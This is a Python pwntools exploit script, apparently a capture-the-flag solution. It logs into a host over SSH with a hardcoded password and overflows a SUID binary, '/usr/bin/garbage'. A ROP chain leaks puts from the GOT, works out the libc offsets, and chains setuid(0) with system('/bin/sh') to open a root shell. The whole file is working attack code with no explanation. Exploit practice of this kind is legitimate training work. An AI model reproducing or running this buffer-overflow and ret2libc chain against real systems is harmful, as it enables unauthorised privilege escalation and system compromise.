from pwn import * 

context (os="linux",arch="amd64")
s = ssh("margo", "Ellingson", password="iamgod$08",port=22) 
p = s.process('/usr/bin/garbage')

context.log_level = "DEBUG"

junk = "A" * 136

got_put = p64(0x404028)
plt_put = p64(0x401050)
pop_rdi_gadget = p64(0x40179b)
auth_func = p64(0x401513)

get_put_offset = junk + pop_rdi_gadget + got_put + plt_put + auth_func


p.recvn(24,timeout=4)
p.sendline(get_put_offset)
p.recvline("access denied.")
p.recvline()
leaked_puts = p.recvline().strip().ljust(8,"\00")
log.success("leaked puts@GTIBCL: " + str(leaked_puts))

leaked_puts = u64(leaked_puts)


puts_on_machine = 0x0809c0
system_on_machine = 0x04f440
sh_on_machine = 0x1b3e9a
setuid_on_machine = 0xe5970

offset =  leaked_puts - puts_on_machine
system_actual = p64(offset + system_on_machine)
sh_actual = p64(offset + sh_on_machine)
setuid_actual = p64(offset + setuid_on_machine)

writable_mem = p64(0x4040d0)
gets = p64(0x401100)

# for suid programs the suid bit needs to be set
payload_with_static_sh = junk + pop_rdi_gadget + p64(0) + setuid_actual + pop_rdi_gadget + sh_actual + system_actual
payload_with_dynamic_sh = junk + pop_rdi_gadget + writable_mem + gets + system_actual 

test = junk + pop_rdi_gadget + sh_actual + plt_put

p.recvn(24,timeout=4)
p.sendline(payload_with_static_sh)
p.recvuntil("access denied.")
p.recvline()
p.interactive()
#
#p.interactive()